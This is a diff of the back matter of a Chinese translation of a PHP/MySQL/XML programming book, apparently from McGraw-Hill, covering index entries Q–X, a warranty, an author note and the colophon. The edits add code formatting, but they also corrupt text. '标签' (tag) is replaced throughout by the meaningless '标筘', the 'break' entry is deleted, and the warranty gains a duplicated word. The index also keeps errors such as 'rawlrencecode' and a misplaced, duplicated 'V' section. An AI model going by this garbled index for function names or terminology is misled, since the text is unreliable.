 - 字段的递增, 130–131
+
 - 插入
+
     - 为其定义表单, 150–153
+
     - 处理插入操作, 153–154
+
     - 验证, 156
+
 - 从表中移除, 140
+
 - 排序, 159–162
+
 - 递归函数, 97–101
+
 - 引用, 253–254
+
 - 正则表达式, 196
+
 - 重新初始化目录, 111
+
 - 关联数据库表，定义, 346
+
 - 移除
+
     - 从数据库表中移除列, 127–128
 
 ## Q
 
 - 示例查询 (QBE) 工具, 186–189
+
 - 问号字符 (?), 197
+
 - 征稿 (RFC) 文档, 288
-- require 指令, 322
+
+- `require` 指令, 322
+
 - 重置按钮, 309
+
 - RFC。参见征稿 (RFC) 文档
-- RLIKE 运算符, 232
-- rm config.cache 命令, 11
+
+- `RLIKE` 运算符, 232
+
+- `rm config.cache` 命令, 11
+
 - 数据库表行, 193
+
 - 运行 CGI , 290–292
 
 ## R
 
 - 单选按钮, 310
-- rawlrencecode 函数, 298
+
+- `rawlrencecode` 函数, 298
+
 - 领域, 321
+
 - 记录
+
     - 插入表中, 129
+
     - 从表中选择, 131
+
     - 克隆, 171–174
 
 ## S
 
 - 标量变量
+
     - 赋值, 39–40
+
     - 命名, 38–39
+
     - 目的, 38
+
     - 引用, 253–254
+
     - 查找文本。参见模式匹配
+
 - 使用 CGI 搜索网站, 292
+
 - 安全字段, 301
+
 - 安全问题
+
     - CGI 与, 299–300
+
     - Cookie 与, 300
+
     - 参见身份认证
-- select 语句
+
+- `select` 语句
+
     - 字段列表, 131–132
+
     - 目的, 120, 131
+
     - 结果排序, 136–137
-- <SELECT>.<SELECT> 标签, 310
+
+- `<SELECT>.<SELECT>` 标筘, 310
+
 - SGML (标准通用标记语言), 380
+
 - 快捷赋值运算符, 66
+
 - 简单表达式, 70–71
+
 - 单引号字符串, 34–35
-- SIZE 修饰符, 308
+
+- `SIZE` 修饰符, 308
+
 - 斜杠崩溃 (/), 205
+
 - 记录排序, 159–162
+
 - 源目录，重新初始化, 11
+
 - XML 文档中的特殊字符, 390
-- split 函数, 200–205
+
+- `split` 函数, 200–205
+
 - SQL (结构查询语言)，起源, 120
+
 - SQL 语句
+
     - 使用其创建表, 332–335
+
     - 使用其创建连接表, 337–342
+
     - 使用 mysql 工具程序执行, 121
+
     - 生成动态, 154–156
-    - sql_regcase 函数, 201
+
+    - `sql_regcase` 函数, 201
+
 - 标准通用标记语言 (SGML)。参见 SGML (标准通用标记语言)
+
 - 语句
+
     - 操作, 73
-    - alter, 121
+
+    - `alter`, 121
+
     - 赋值, 73
-    - break, 83–85
+
     - 组件, 70, 322
-    - create, 121
+
+    - `create`, 121
+
     - 决策, 73
-    - drop, 121
-    - echo, 258
+
+    - `drop`, 121
+
+    - `echo`, 258
+
     - 解释, 72
-    - if, 74–76
-    - insert, 120, 129
-    - jump, 83–88
-    - loop, 78
-    - no-action, 72
-    - select
+
+    - `if`, 74–76
+
+    - `insert`, 120, 129
+
+    - `jump`, 83–88
+
+    - `loop`, 78
+
+    - `no-action`, 72
+
+    - `select`
+
         - 字段列表, 131–132
+
         - 目的, 120, 131
+
         - 结果排序, 136–137
+
     - SQL
+
         - 使用其创建基础表, 332–335
+
         - 使用其创建连接表, 337–342
+
         - 使用 mysql 执行, 121
+
         - 生成动态, 154–156
+
         - 表, 121–224
-        - update, 120
+
+        - `update`, 120
+
         - 参见特定语句
+
     - 状态头, 294
-    - string_field_name, 149
+
+    - `string_field_name`, 149
+
     - 字符串连接运算符, 62
+
     - 字符串类型, 43
+
     - 字符串字量, 41–43
+
     - 字符串
+
         - 添加前缀或后缀, 227–228
+
         - 双引号, 37
+
         - 定义常量, 50
+
         - 仅确定两个单词, 221–222
+
         - 包含, 223–224
+
         - 包含重复字符, 46–49
+
         - 双引号, 35–37
+
         - 查找第一个或最后一个单词, 221
+
         - 匹配最后一个单词, 224
+
         - 匹配第二个单词, 224–225
+
         - 移除空白, 226–227
+
         - 反转两个单词, 228
+
         - 单引号, 34–35
+
         - 分割, 229
+
         - 提交按钮, 309
-        - switch 关键字, 76–78
+
+        - `switch` 关键字, 76–78
+
         - 符号链接, 13
+
 - 同步媒体语言 (SMIL), 408–409
-- SYSTEM 关键字, 407
+
+- `SYSTEM` 关键字, 407
+
 - 标签
+
     - HTML 注释, 275–278
-    - 字体标签, 279–280
-    - head 标签, 265–268, 306
-    - 标题级标签, 307
-    - 段落标签 <p>..</BODY>, 307
-    - <BR>, 307
-    - <FORM>..</FORM>, 307
-    - <H1>..</H1>, 307
-    - <HEAD>..</HEAD>, 306
-    - <HTML>..</HTML>, 307
-    - <INPUT>, 308–310
-    - <p>, 307, 381–382
-    - <SELECT>..</SELECT>, 310
-    - <TEXTAREA>..</TEXTAREA>, 311
-    - <TITLE>..</TITLE> 标签, 273–275
+
+    - 字体标筘, 279–280
+
+    - `head` 标筘, 265–268, 306
+
+    - 标题级标筘, 307
+
+    - 段落标筘 `<p>..</BODY>`, 307
+
+    - `<BR>`, 307
+
+    - `<FORM>..</FORM>`, 307
+
+    - `<H1>..</H1>`, 307
+
+    - `<HEAD>..</HEAD>`, 306
+
+    - `<HTML>..</HTML>`, 307
+
+    - `<INPUT>`, 308–310
+
+    - `<p>`, 307, 381–382
+
+    - `<SELECT>..</SELECT>`, 310
+
+    - `<TEXTAREA>..</TEXTAREA>`, 311
+
+    - `<TITLE>..</TITLE>` 标筘, 273–275
+
 - 表语句, 121–124
+
 - 数据库表
+
     - 身份认证, 316
+
     - 修改信息, 129–131
+
     - 中的列
+
         - 添加, 124–125
+
         - 移除, 127–128
+
         - 创建, 149–150, 332–335
+
     - 将数据导出到 SQL 语句, 183–186
+
     - 如何关联的示例, 330–332
+
     - 解释, 117, 118
+
 - HTML 缓存和创建, 281
+
 - 关联, 336–337
+
 - 连接表, 337–342
+
 - 表中的记录
+
     - 添加, 129
+
     - 选择, 131
+
     - 移除, 140
+
     - 引用完整性, 346–347
+
 - 表中的行, 193
+
 - XML
+
     - 平衡, 384
+
     - 大写敏感, 384
+
     - doctype, 261
+
     - 空, 387
+
     - 功能, 380
+
     - 参见特定标签名称
-- tar (磁带归档), 12
-- tar 命令, 14
+
+- `tar` (磁带归档), 12
+
+- `tar` 命令, 14
+
 - 三元运算符, 54–55
+
 - 测试
+
 - MyODBC, 29–30
+
 - MySQL, 17–20
+
 - ODBC, 29–30
+
 - 文本框, 311
+
 - 文本字面量, 34–37
-- 文本解析。参见模式匹配 <TEXTAREA>..</TEXTAREA> 标签, 311
-- <TITLE>..</TITLE> 标签, 273–275
+
+- 文本解析。参见模式匹配 `<TEXTAREA>..</TEXTAREA>` 标筘, 311
+
+- `<TITLE>..</TITLE>` 标筘, 273–275
+
 - 真/假逻辑实现, 62–66
-- TYPE 修饰符, 308
+
+- `TYPE` 修饰符, 308
+
 ## U
+
 - 一元运算符, 58–60
+
 - Unicode 标准，与 XML, 385
+
 - 统一资源定位符 (URL)。参见 URL (统一资源定位符)编码和解码
-- update 语句, 120, 129–131
+
+- `update` 语句, 120, 129–131
+
 - URL (统一资源定位符)，编码, 297–299
+
 - Usenet 新闻组
+
 - 用户跟踪, 360–362
+
 ## W
+
 - 浏览器
+
     - 确定 Cookie, 302–304
+
     - 使用 HTML 显示, 410
+
     - 使用 PHP 显示, 382
+
 - Web 服务器, 5
+
 - Web 站点
+
     - 动态, 189
+
     - 基础, 288
+
     - 解析信息, 417–421
+
     - 处理信息, 421–425
+
     - 检索信息, 416–417
+
     - 搜索, 292
+
 - 良好的 XML 文档, 396
-- where 关键字, 81–82
+
+- `where` 关键字, 81–82
+
 ## V
+
 - 有效表语句, 121–124
+
 - 数据库表
+
     - 添加, 124–125
+
     - 移除, 127–128
+
     - 创建, 149–150, 332–335
+
 - 将数据导出到 SQL 语句, 183–186
+
 - 如何关联的示例, 330–332
+
 - 解释, 117, 118
+
 - HTML 缓存和创建, 281
+
 - 关联, 336–337
+
 - 连接表, 337–342
+
 - 表中的记录
+
     - 添加, 129
+
     - 选择, 131
+
     - 移除, 140
+
     - 引用完整性, 346–347
+
 - 表中的行, 193
-- VALUE 修饰符, 308
+
+- `VALUE` 修饰符, 308
+
 - 变量函数, 183–186
+
 - 字符串字面量, 35–37
+
 - 解释, 46–49
+
 - 变量名, 149
+
 - 变量
-    - $PHP_SELF, 152
-    - $this, 244
+
+    - `$PHP_SELF`, 152
+
+    - `$this`, 244
+
 - 数组
+
     - 赋值, 39–40
+
     - 命名, 38–39
+
     - 目的, 38
+
     - 引用, 253–254
+
     - 查找文本。参见模式匹配
+
 ## X
+
 - XML (可扩展标记语言)
+
     - 与 HTML 的区别, 384–385
+
     - 起源, 380
+
     - 资源, 412
+
 - 与 SGML 的相似性, 380
+
 - 与 Unicode 标准, 385
+
 - XML 应用, 407–409
+
 - XML 声明, 393
+
 - XML 文档
+
     - 外观, 410–412
+
     - 注释, 393
+
     - 定义, 386
+
     - 提取信息, 416–417
+
     - 包含其他文档, 390–391
+
     - 整体结构, 393–395
+
     - 解析信息, 417–421
+
 - 处理信息, 421–425
+
 - 有效, 396
+
 - 良好的 XML, 396
+
 - XML 解析器, 385–386, 417–421
+
 - XML 处理器, 385–386
-
-
-
-
 
 # 关于作者
 
@@ -16206,14 +18757,18 @@ McGraw-Hill 保留随时更改或修改产品内容的权利。
 McGraw-Hill 保证随附的软片在购买之日起六十天内在材料和工艺上没有缺陷。如果 McGraw-Hill 在质保期内收到材料或工艺缺陷的书面通知，且经 McGraw-Hill 确定该通知正确，则 McGraw-Hill 将更换有缺陷的软片。寄至：
 
 - 客户服务
+
 McGraw-Hill
+
 Gahanna Industrial Park
+
 860 Taylor Station
+
 Blacklick, Ohio 43004-9615
 
 违反本有限质保的全部和唯一责任限于更换有缺陷的软片，且不包括或延伸涵盖任何其他损害的索赔或权利，包括间接损害或类似的索赔，即使 McGraw-Hill 已被专门告知此类损害的可能性。在任何情况下，McGraw-Hill 对你或任何其他人的损害赔偿责任均不超过建议零售价或购买该产品许可的实际价格的较低者，无论索赔以何种形式。
 
-McGraw-Hill Companies, Inc. 特别否认所有其他明示或暗示的保证，包括但不限于对任何商品适用性或特定特定用途适用性的保证。具体而言，McGraw-Hill 不对产品适用于任何特定用途做出任何陈述或保证，且任何暗示的商品适用性保证仅限于涵盖物理软片的六十天有限质保期（不包括软件和信息），在其他方面该保证已被明确且具体地提出主张。
+McGraw-Hill Companies, Inc. 特别否认所有其他明示或暗示的保证，包括但不限于对任何商品适用性或特定特定用途适用性的保证。具体而言，McGraw-Hill 不对产品适用于任何特特定用途做出任何陈述或保证，且任何暗示的商品适用性保证仅限于涵盖物理软片的六十天有限质保期（不包括软件和信息），在其他方面该保证已被明确且具体地提出主张。
 
 本有限质保赋予了你法律权利；你可能拥有其他随州而异的权利。某些州不允许排除附带损害或间接损害，或限制隐含质保的持续时间，因此上述某些内容可能不适用于你。
 
@@ -16234,20 +18789,29 @@ David Medinet 是十二本书的作者或合著者，包括 Que 出版的《Perl
 P/N 135340-2 part of ISBN 0-07-135342-9
 
 - UNIX Administrator's Complete Programming Toolkit
+
 - PHP Fundamentals
+
 - Database Fundamentals
+
 - Advanced PHP
+
 - Application Fundamentals
+
 - Application Examples
+
 - Extending PHP
 
 系列设计：Tisa Lynn Lerner
+
 封面照片：Robert Clare/ FPG International, LLC
 
 McGraw-Hill
+
 1221 Avenue of the Americas
+
 New York, NY 10020
 
 McGraw-Hill
-A Division of The McGraw-Hill Companies
 
+A Division of The McGraw-Hill Companies
